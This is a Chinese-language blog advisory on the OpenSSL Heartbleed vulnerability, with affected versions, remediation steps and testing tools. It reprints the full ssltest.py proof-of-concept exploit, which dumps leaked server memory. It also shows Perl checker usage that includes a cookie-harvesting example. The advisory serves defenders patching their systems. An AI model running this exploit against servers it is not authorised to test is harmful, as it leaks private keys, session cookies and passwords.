<h3 id="openssl_cve20140160_">OpenSSL CVE-2014-0160 嚴重漏洞</h3>

<p>OpenSSL 今天公告了一個極度嚴重的漏洞（<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE-2014-0160</a>），被稱為「<a href="http://heartbleed.com/">Heartbleed</a>」，而他確實也如同心臟噴出血般嚴重。這個漏洞能讓攻擊者從伺服器記憶體中讀取 64 KB 的資料，利用傳送 heartbeat 的封包給伺服器，在封包中控制變數導致 memcpy 函數複製錯誤的記憶體資料，因而擷取記憶體中可能存在的機敏資料。記憶體中最嚴重可能包含 ssl private key、session cookie、使用者密碼等，因此可能因為這樣的漏洞導致伺服器遭到入侵或取得使用者帳號。</p>
<!-- more -->
<p>詳細的分析可以參閱 <a href="http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html">existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug</a></p>

<ul>
<li>軟體名稱：OpenSSL</li>

<li>影響範圍：1.0.1 至 1.0.1f / 1.0.2-beta ~ 1.0.2-beta1</li>

<li>修復版本：1.0.1g / 1.0.2-beta2</li>

<li>影響系統版本
<ul>
<li>Debian Wheezy (stable), OpenSSL 1.0.1e-2+deb7u4</li>

<li>Ubuntu 12.04.4 LTS, OpenSSL 1.0.1-4ubuntu5.11</li>

<li>CentOS 6.5, OpenSSL 1.0.1e-15</li>

<li>Fedora 18, OpenSSL 1.0.1e-4</li>

<li>OpenBSD 5.3 (OpenSSL 1.0.1c 10 May 2012) and 5.4 (OpenSSL 1.0.1c 10 May 2012)</li>

<li>FreeBSD 10.0 - OpenSSL 1.0.1e 11 Feb 2013</li>

<li>NetBSD 5.0.2 (OpenSSL 1.0.1e)</li>

<li>OpenSUSE 12.2 (OpenSSL 1.0.1c)</li>
</ul>
</li>

<li>影響服務：HTTP、SMTPS、IMAPS、POP3S 等使用 OpenSSL 之服務</li>
</ul>

<p>OpenSSL 的公告如下：<a href="https://www.openssl.org/news/secadv_20140407.txt">https://www.openssl.org/news/secadv_20140407.txt</a></p>
<pre>
A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.
</pre>
<h3 id="">如何自我檢測？</h3>

<p>要如何測試自己的網站有沒有這樣的漏洞呢？可以利用以下的網站或工具直接查詢。</p>

<ul>
<li>Heartbleed test <a href="http://filippo.io/Heartbleed/">http://filippo.io/Heartbleed/</a></li>
</ul>

<p>直接輸入 Domain 即可查詢，例如「fbi.gov」。</p>

<p><a href="https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png"><img src="https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/w897-h678-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png" alt="OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov" title="OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov" /></a></p>

<ul>
<li>自我測試工具 <a href="http://s3.jspenguin.org/ssltest.py">http://s3.jspenguin.org/ssltest.py</a> （或 <a href="http://pastebin.com/WmxzjkXJ">http://pastebin.com/WmxzjkXJ</a>）</li>
</ul>

<p>使用方法直接執行「python ssltest.py ifttt.com」，或是用「-p」指定特定 SSL 連接埠。畫面上會顯示出記憶體資料，可能內含機敏資料例如 private key、session cookie 等。</p>

<p><a href="https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png"><img src="https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/w509-h677-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png" alt="OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com" title="OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com" /></a></p>

<p>原始碼如下：</p>
<div class='highlight'><pre><code class='python'><span class='c'>#!/usr/bin/python</span>

<span class='c'># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span>
<span class='c'># The author disclaims copyright to this source code.</span>

<span class='kn'>import</span> <span class='nn'>sys</span>
<span class='kn'>import</span> <span class='nn'>struct</span>
<span class='kn'>import</span> <span class='nn'>socket</span>
<span class='kn'>import</span> <span class='nn'>time</span>
<span class='kn'>import</span> <span class='nn'>select</span>
<span class='kn'>import</span> <span class='nn'>re</span>
<span class='kn'>from</span> <span class='nn'>optparse</span> <span class='kn'>import</span> <span class='n'>OptionParser</span>

<span class='n'>options</span> <span class='o'>=</span> <span class='n'>OptionParser</span><span class='p'>(</span><span class='n'>usage</span><span class='o'>=</span><span class='s'>&#39;%prog server [options]&#39;</span><span class='p'>,</span> <span class='n'>description</span><span class='o'>=</span><span class='s'>&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;</span><span class='p'>)</span>
<span class='n'>options</span><span class='o'>.</span><span class='n'>add_option</span><span class='p'>(</span><span class='s'>&#39;-p&#39;</span><span class='p'>,</span> <span class='s'>&#39;--port&#39;</span><span class='p'>,</span> <span class='nb'>type</span><span class='o'>=</span><span class='s'>&#39;int&#39;</span><span class='p'>,</span> <span class='n'>default</span><span class='o'>=</span><span class='mi'>443</span><span class='p'>,</span> <span class='n'>help</span><span class='o'>=</span><span class='s'>&#39;TCP port to test (default: 443)&#39;</span><span class='p'>)</span>

<span class='k'>def</span> <span class='nf'>h2bin</span><span class='p'>(</span><span class='n'>x</span><span class='p'>):</span>
    <span class='k'>return</span> <span class='n'>x</span><span class='o'>.</span><span class='n'>replace</span><span class='p'>(</span><span class='s'>&#39; &#39;</span><span class='p'>,</span> <span class='s'>&#39;&#39;</span><span class='p'>)</span><span class='o'>.</span><span class='n'>replace</span><span class='p'>(</span><span class='s'>&#39;</span><span class='se'>\n</span><span class='s'>&#39;</span><span class='p'>,</span> <span class='s'>&#39;&#39;</span><span class='p'>)</span><span class='o'>.</span><span class='n'>decode</span><span class='p'>(</span><span class='s'>&#39;hex&#39;</span><span class='p'>)</span>

<span class='n'>hello</span> <span class='o'>=</span> <span class='n'>h2bin</span><span class='p'>(</span><span class='s'>&#39;&#39;&#39;</span>
<span class='s'>16 03 02 00  dc 01 00 00 d8 03 02 53</span>
<span class='s'>43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span>
<span class='s'>bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span>
<span class='s'>00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span>
<span class='s'>00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span>
<span class='s'>c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span>
<span class='s'>c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span>
<span class='s'>c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span>
<span class='s'>c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span>
<span class='s'>00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span>
<span class='s'>03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span>
<span class='s'>00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span>
<span class='s'>00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span>
<span class='s'>00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span>
<span class='s'>00 0f 00 01 01                                  </span>
<span class='s'>&#39;&#39;&#39;</span><span class='p'>)</span>

<span class='n'>hb</span> <span class='o'>=</span> <span class='n'>h2bin</span><span class='p'>(</span><span class='s'>&#39;&#39;&#39; </span>
<span class='s'>18 03 02 00 03</span>
<span class='s'>01 40 00</span>
<span class='s'>&#39;&#39;&#39;</span><span class='p'>)</span>

<span class='k'>def</span> <span class='nf'>hexdump</span><span class='p'>(</span><span class='n'>s</span><span class='p'>):</span>
    <span class='k'>for</span> <span class='n'>b</span> <span class='ow'>in</span> <span class='nb'>xrange</span><span class='p'>(</span><span class='mi'>0</span><span class='p'>,</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>s</span><span class='p'>),</span> <span class='mi'>16</span><span class='p'>):</span>
        <span class='n'>lin</span> <span class='o'>=</span> <span class='p'>[</span><span class='n'>c</span> <span class='k'>for</span> <span class='n'>c</span> <span class='ow'>in</span> <span class='n'>s</span><span class='p'>[</span><span class='n'>b</span> <span class='p'>:</span> <span class='n'>b</span> <span class='o'>+</span> <span class='mi'>16</span><span class='p'>]]</span>
        <span class='n'>hxdat</span> <span class='o'>=</span> <span class='s'>&#39; &#39;</span><span class='o'>.</span><span class='n'>join</span><span class='p'>(</span><span class='s'>&#39;</span><span class='si'>%02X</span><span class='s'>&#39;</span> <span class='o'>%</span> <span class='nb'>ord</span><span class='p'>(</span><span class='n'>c</span><span class='p'>)</span> <span class='k'>for</span> <span class='n'>c</span> <span class='ow'>in</span> <span class='n'>lin</span><span class='p'>)</span>
        <span class='n'>pdat</span> <span class='o'>=</span> <span class='s'>&#39;&#39;</span><span class='o'>.</span><span class='n'>join</span><span class='p'>((</span><span class='n'>c</span> <span class='k'>if</span> <span class='mi'>32</span> <span class='o'>&lt;=</span> <span class='nb'>ord</span><span class='p'>(</span><span class='n'>c</span><span class='p'>)</span> <span class='o'>&lt;=</span> <span class='mi'>126</span> <span class='k'>else</span> <span class='s'>&#39;.&#39;</span> <span class='p'>)</span><span class='k'>for</span> <span class='n'>c</span> <span class='ow'>in</span> <span class='n'>lin</span><span class='p'>)</span>
        <span class='k'>print</span> <span class='s'>&#39;  </span><span class='si'>%04x</span><span class='s'>: </span><span class='si'>%-48s</span><span class='s'> </span><span class='si'>%s</span><span class='s'>&#39;</span> <span class='o'>%</span> <span class='p'>(</span><span class='n'>b</span><span class='p'>,</span> <span class='n'>hxdat</span><span class='p'>,</span> <span class='n'>pdat</span><span class='p'>)</span>
    <span class='k'>print</span>

<span class='k'>def</span> <span class='nf'>recvall</span><span class='p'>(</span><span class='n'>s</span><span class='p'>,</span> <span class='n'>length</span><span class='p'>,</span> <span class='n'>timeout</span><span class='o'>=</span><span class='mi'>5</span><span class='p'>):</span>
    <span class='n'>endtime</span> <span class='o'>=</span> <span class='n'>time</span><span class='o'>.</span><span class='n'>time</span><span class='p'>()</span> <span class='o'>+</span> <span class='n'>timeout</span>
    <span class='n'>rdata</span> <span class='o'>=</span> <span class='s'>&#39;&#39;</span>
    <span class='n'>remain</span> <span class='o'>=</span> <span class='n'>length</span>
    <span class='k'>while</span> <span class='n'>remain</span> <span class='o'>&gt;</span> <span class='mi'>0</span><span class='p'>:</span>
        <span class='n'>rtime</span> <span class='o'>=</span> <span class='n'>endtime</span> <span class='o'>-</span> <span class='n'>time</span><span class='o'>.</span><span class='n'>time</span><span class='p'>()</span> 
        <span class='k'>if</span> <span class='n'>rtime</span> <span class='o'>&lt;</span> <span class='mi'>0</span><span class='p'>:</span>
            <span class='k'>return</span> <span class='bp'>None</span>
        <span class='n'>r</span><span class='p'>,</span> <span class='n'>w</span><span class='p'>,</span> <span class='n'>e</span> <span class='o'>=</span> <span class='n'>select</span><span class='o'>.</span><span class='n'>select</span><span class='p'>([</span><span class='n'>s</span><span class='p'>],</span> <span class='p'>[],</span> <span class='p'>[],</span> <span class='mi'>5</span><span class='p'>)</span>
        <span class='k'>if</span> <span class='n'>s</span> <span class='ow'>in</span> <span class='n'>r</span><span class='p'>:</span>
            <span class='n'>data</span> <span class='o'>=</span> <span class='n'>s</span><span class='o'>.</span><span class='n'>recv</span><span class='p'>(</span><span class='n'>remain</span><span class='p'>)</span>
            <span class='c'># EOF?</span>
            <span class='k'>if</span> <span class='ow'>not</span> <span class='n'>data</span><span class='p'>:</span>
                <span class='k'>return</span> <span class='bp'>None</span>
            <span class='n'>rdata</span> <span class='o'>+=</span> <span class='n'>data</span>
            <span class='n'>remain</span> <span class='o'>-=</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>data</span><span class='p'>)</span>
    <span class='k'>return</span> <span class='n'>rdata</span>
        

<span class='k'>def</span> <span class='nf'>recvmsg</span><span class='p'>(</span><span class='n'>s</span><span class='p'>):</span>
    <span class='n'>hdr</span> <span class='o'>=</span> <span class='n'>recvall</span><span class='p'>(</span><span class='n'>s</span><span class='p'>,</span> <span class='mi'>5</span><span class='p'>)</span>
    <span class='k'>if</span> <span class='n'>hdr</span> <span class='ow'>is</span> <span class='bp'>None</span><span class='p'>:</span>
        <span class='k'>print</span> <span class='s'>&#39;Unexpected EOF receiving record header - server closed connection&#39;</span>
        <span class='k'>return</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span>
    <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>ln</span> <span class='o'>=</span> <span class='n'>struct</span><span class='o'>.</span><span class='n'>unpack</span><span class='p'>(</span><span class='s'>&#39;&gt;BHH&#39;</span><span class='p'>,</span> <span class='n'>hdr</span><span class='p'>)</span>
    <span class='n'>pay</span> <span class='o'>=</span> <span class='n'>recvall</span><span class='p'>(</span><span class='n'>s</span><span class='p'>,</span> <span class='n'>ln</span><span class='p'>,</span> <span class='mi'>10</span><span class='p'>)</span>
    <span class='k'>if</span> <span class='n'>pay</span> <span class='ow'>is</span> <span class='bp'>None</span><span class='p'>:</span>
        <span class='k'>print</span> <span class='s'>&#39;Unexpected EOF receiving record payload - server closed connection&#39;</span>
        <span class='k'>return</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span>
    <span class='k'>print</span> <span class='s'>&#39; ... received message: type = </span><span class='si'>%d</span><span class='s'>, ver = </span><span class='si'>%04x</span><span class='s'>, length = </span><span class='si'>%d</span><span class='s'>&#39;</span> <span class='o'>%</span> <span class='p'>(</span><span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>))</span>
    <span class='k'>return</span> <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>pay</span>

<span class='k'>def</span> <span class='nf'>hit_hb</span><span class='p'>(</span><span class='n'>s</span><span class='p'>):</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>send</span><span class='p'>(</span><span class='n'>hb</span><span class='p'>)</span>
    <span class='k'>while</span> <span class='bp'>True</span><span class='p'>:</span>
        <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>pay</span> <span class='o'>=</span> <span class='n'>recvmsg</span><span class='p'>(</span><span class='n'>s</span><span class='p'>)</span>
        <span class='k'>if</span> <span class='n'>typ</span> <span class='ow'>is</span> <span class='bp'>None</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;No heartbeat response received, server likely not vulnerable&#39;</span>
            <span class='k'>return</span> <span class='bp'>False</span>

        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='mi'>24</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;Received heartbeat response:&#39;</span>
            <span class='n'>hexdump</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>)</span>
            <span class='k'>if</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>)</span> <span class='o'>&gt;</span> <span class='mi'>3</span><span class='p'>:</span>
                <span class='k'>print</span> <span class='s'>&#39;WARNING: server returned more data than it should - server is vulnerable!&#39;</span>
            <span class='k'>else</span><span class='p'>:</span>
                <span class='k'>print</span> <span class='s'>&#39;Server processed malformed heartbeat, but did not return any extra data.&#39;</span>
            <span class='k'>return</span> <span class='bp'>True</span>

        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='mi'>21</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;Received alert:&#39;</span>
            <span class='n'>hexdump</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>)</span>
            <span class='k'>print</span> <span class='s'>&#39;Server returned error, likely not vulnerable&#39;</span>
            <span class='k'>return</span> <span class='bp'>False</span>

<span class='k'>def</span> <span class='nf'>main</span><span class='p'>():</span>
    <span class='n'>opts</span><span class='p'>,</span> <span class='n'>args</span> <span class='o'>=</span> <span class='n'>options</span><span class='o'>.</span><span class='n'>parse_args</span><span class='p'>()</span>
    <span class='k'>if</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>args</span><span class='p'>)</span> <span class='o'>&lt;</span> <span class='mi'>1</span><span class='p'>:</span>
        <span class='n'>options</span><span class='o'>.</span><span class='n'>print_help</span><span class='p'>()</span>
        <span class='k'>return</span>

    <span class='n'>s</span> <span class='o'>=</span> <span class='n'>socket</span><span class='o'>.</span><span class='n'>socket</span><span class='p'>(</span><span class='n'>socket</span><span class='o'>.</span><span class='n'>AF_INET</span><span class='p'>,</span> <span class='n'>socket</span><span class='o'>.</span><span class='n'>SOCK_STREAM</span><span class='p'>)</span>
    <span class='k'>print</span> <span class='s'>&#39;Connecting...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>connect</span><span class='p'>((</span><span class='n'>args</span><span class='p'>[</span><span class='mi'>0</span><span class='p'>],</span> <span class='n'>opts</span><span class='o'>.</span><span class='n'>port</span><span class='p'>))</span>
    <span class='k'>print</span> <span class='s'>&#39;Sending Client Hello...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>send</span><span class='p'>(</span><span class='n'>hello</span><span class='p'>)</span>
    <span class='k'>print</span> <span class='s'>&#39;Waiting for Server Hello...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='k'>while</span> <span class='bp'>True</span><span class='p'>:</span>
        <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>pay</span> <span class='o'>=</span> <span class='n'>recvmsg</span><span class='p'>(</span><span class='n'>s</span><span class='p'>)</span>
        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='bp'>None</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;Server closed connection without sending Server Hello.&#39;</span>
            <span class='k'>return</span>
        <span class='c'># Look for server hello done message.</span>
        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='mi'>22</span> <span class='ow'>and</span> <span class='nb'>ord</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>[</span><span class='mi'>0</span><span class='p'>])</span> <span class='o'>==</span> <span class='mh'>0x0E</span><span class='p'>:</span>
            <span class='k'>break</span>

    <span class='k'>print</span> <span class='s'>&#39;Sending heartbeat request...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>send</span><span class='p'>(</span><span class='n'>hb</span><span class='p'>)</span>
    <span class='n'>hit_hb</span><span class='p'>(</span><span class='n'>s</span><span class='p'>)</span>

<span class='k'>if</span> <span class='n'>__name__</span> <span class='o'>==</span> <span class='s'>&#39;__main__&#39;</span><span class='p'>:</span>
    <span class='n'>main</span><span class='p'>()</span>
</code></pre></div>
<ul>
<li>自我測試工具 <a href="https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl">https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl</a></li>
</ul>

<p>使用方法直接執行「perl check-ssl-heartbleed.pl mail.XXXXXX.gov.tw:443」，可在網域名稱後指定特定 SSL 連接埠。</p>

<p>使用說明：</p>
<div class='highlight'><pre><code class='console'><span class='go'>Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)</span>
<span class='go'>Usage: check-ssl-heartbleed.pl [ --starttls proto[:arg] ] [ --timeout T ] host:port</span>
<span class='go'>  --starttls proto[:arg] - start plain and upgrade to SSL with</span>
<span class='go'>			   starttls protocol (imap,smtp,http,pop)</span>
<span class='go'>  -T|--timeout T         - use timeout (default 5)</span>
<span class='go'>  -H|--heartbeats N      - number of heartbeats (default 1)</span>
<span class='go'>  -s|--show-data [L]     - show heartbeat response if vulnerable, optional</span>
<span class='go'>                           parameter L specifies number of bytes per line (16)</span>
<span class='go'>  -R|--show-regex-data R - show data matching perl regex R. Option can be</span>
<span class='go'>                           used multiple times</span>
<span class='go'>  -q|--quiet             - don&#39;t show anything, exit 1 if vulnerable</span>
<span class='go'>  -h|--help              - this screen</span>

<span class='go'>Examples:</span>
<span class='go'>  # check direct www, imaps .. server</span>
<span class='go'>  check-ssl-heartbleed.pl www.google.com:443</span>
<span class='go'>  check-ssl-heartbleed.pl www.google.com:https</span>
<span class='go'>  check-ssl-heartbleed.pl mail.google.com:imaps</span>

<span class='go'>  # try to get Cookies</span>
<span class='go'>  check-ssl-heartbleed.pl -R &#39;Cookie:.*&#39; www.broken-site.com:443</span>

<span class='go'>  # check webserver via proxy</span>
<span class='go'>  check-ssl-heartbleed.pl --starttls http:www.google.com:443 proxy:8000</span>

<span class='go'>  # check imap server, start with plain and upgrade</span>
<span class='go'>  check-ssl-heartbleed.pl --starttls imap imap.gmx.net:143</span>

<span class='go'>  # check pop server, start with plain and upgrade</span>
<span class='go'>  check-ssl-heartbleed.pl --starttls pop pop.gmx.net:110</span>

<span class='go'>  # check smtp server, start with plain and upgrade</span>
<span class='go'>  check-ssl-heartbleed.pl --starttls smtp smtp.gmail.com:587</span>
<span class='go'>  </span>
</code></pre></div>
<h3 id="_2">應對措施</h3>

<p>如果發現自己的伺服器有這樣的漏洞，該怎麼辦呢？</p>

<ol>
<li>確認自己的 OpenSSL 版本是否在受害範圍</li>

<li>使用 ssltest.py 檢測工具檢測是否含有漏洞</li>

<li>更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2</li>

<li>重開所有與 OpenSSL 函式庫相關之服務</li>

<li>重新產生 SSL Private Key (因為 Private Key 可能藉由漏洞外洩)</li>

<li>將網站舊憑證撤銷</li>

<li>清除所有目前網頁伺服器上的 Session （因為可能遭到竊取）</li>

<li>必要時更換網站內使用者密碼，或是密切追蹤網站是否有帳號盜用的情況發生</li>
</ol>

<p>詳細討論與建議可以參考 Heartbleed: What is it and what are options to mitigate it? <a href="http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it">http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it</a></p>

<h3 id="_3">誰會是目標呢？</h3>

<p>真的會有攻擊者利用這樣的攻擊手法嗎？目前在<a href="http://wooyun.org">烏雲 wooyun</a>平台上已經滿滿的資安研究員開始回報網站含有 OpenSSL 漏洞。也有駭客在嘗試撰寫更有效的攻擊利用程式，想要藉此把平常打不下來的網站一舉攻陷。</p>

<p>怎樣的站台會是重點目標呢？含有會員機制的網站特別如此，例如 Web Mail、社群網站等等。因此不少企業要多注意了，例如全世界最大的社群網站 Facebook、SlideShare、台灣知名電信公司網站、社交平台、網路銀行、NAS，都會在這波的攻擊範圍之內。如果沒有儘速修復，等到更有效的攻擊程式出現，就真的等著失血了。</p>

<h3 id="_4">小結</h3>

<p>就連 OpenSSL 這種歷史悠久而且重要的函式庫，都可能犯這種基本的 C 語言程式設計錯誤，老舊的程式碼一定有不少陳年遺毒，如果沒有徹底清查，類似的心臟噴血事件會不斷上演。大家快點止血吧！</p>